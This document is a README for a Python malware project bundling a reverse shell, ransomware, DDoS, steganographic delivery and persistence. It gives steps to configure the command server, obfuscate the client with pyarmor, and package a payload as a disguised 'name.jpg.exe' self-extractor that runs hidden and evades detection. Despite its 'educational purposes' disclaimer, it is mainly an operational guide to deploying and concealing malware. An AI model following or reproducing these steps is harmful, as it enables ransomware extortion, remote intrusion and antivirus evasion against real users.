 # Python Malware

This Python malware is designed for educational purposes only and should never be used for unethical or illegal activities. The malware consists of several components, including reverse shell, ransomware, and DDoS.

## Features

- **Reverse Shell**: Allows the attacker to gain remote access to the compromised system by connecting back to a predefined server and port.
- **Ransomware**: Encrypts user files and demands a ransom to restore access to them. 
- **DDoS (Distributed Denial of Service)**: Performs a DDoS attack on a specified target.
- **Steganography Delivery**: Hide malware in png file for bypassing some AV/EDR with autorun.
- **Persistance**: Malware is persistant on windows host

## Installation

### Requirements

- Ensure you have enough space and the necessary system resources.
- Clone the source code from the provided repository using:
  ```
  git clone --recursive https://github.com/davidathuil/python-malware.git
  ```

### Server
Before starting the server you need to tweek some configuration in server.py: 
```
action = "crypt"
parametres = {'ip': '172.76.32.12', 'protocole': 'udp','path':'/home/amine/Doc'}
```
* action : Type wich action server must send to client. crypt | ddos | reverse_shell
* parametres : Additional action parameter. 

Type this command in server folder to start the server :
```
python3 ./server.py
```

### Client

The client component includes the reverse shell, ransomware, and DDoS functionalities. Follow the instructions below to run and set up the client:
```
python3 ./client.py
```
1. Obfuscation process:
   ```
   sudo apt-get update
   sudo apt-get install -y build-essential libssl-dev zlib1g-dev libbz2-dev \
   libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev \
   xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git
   ```

2. Install `pyenv`:
   ```
   curl https://pyenv.run/ | bash
   export PATH="$HOME/.pyenv/bin:$PATH"
   pyenv install 3.10.0
   pyenv global 3.10.0
   python --version
   ```

3. Install the required Python packages:
   ```
   pip install pyarmor
   ```

4. Obfuscate the Python script:
   ```
   pyarmor gen Desktop/pythonmalware/python-malware/client.py
   ```
5. Run the obfuscated client:
   ```
   Python3 ./clientobfuscated.py
   ```

 ## JPEG to ICO and Create Self-Extracting EXE

In this guide, we will learn how to convert a JPEG image into an ICO format using an online tool and then create a self-extracting EXE archive containing the ICO file and a malicious payload.

### Prerequisites

1. Visit [icoconverter.com](https://www.icoconverter.com/) to convert the JPEG image to ICO format.
2. Install `auto-py-to-exe` using pip:

```bash
pip install auto-py-to-exe
```

### JPEG to ICO

1. Go to [icoconverter.com](https://www.icoconverter.com/).
2. Upload your JPEG image.
3. Download the ICO file.

### Creating the Self-Extracting EXE

1. Open a terminal and run `auto-py-to-exe`.
2. Add the ICO file to the archive.
3. Select the EXE output type and add the malicious payload (e.g., `hack.exe`).
4. Configure the SFX archive:
   - Check "Unpack to temporary folder" to avoid detection.
   - Hide all windows during extraction.
5. Load the SFX icon with the ICO file.
6. Update the archive:
   - Extract and update files.
   - Overwrite all files.

After completing these steps, you will have a self-extracting EXE file (e.g., `name.jpg.exe`) that contains the ICO file and the malicious payload (`hack.exe`). When executed, the EXE file will extract the contents to a temporary folder and run the payload without leaving any traces.

## Usage

To use the Python malware, follow the instructions provided in the documentation.

## Next Features

- Keylogger with stealthy exfiltration capabilities.
- Advanced encryption techniques for ransomware to improve resistance against decryption tools.
- Advanced evasion techniques to bypass antivirus and endpoint detection.

Remember, the use of this malware for unethical or illegal activities is strictly prohibited. Use it for educational purposes only, and always follow your local and international laws.
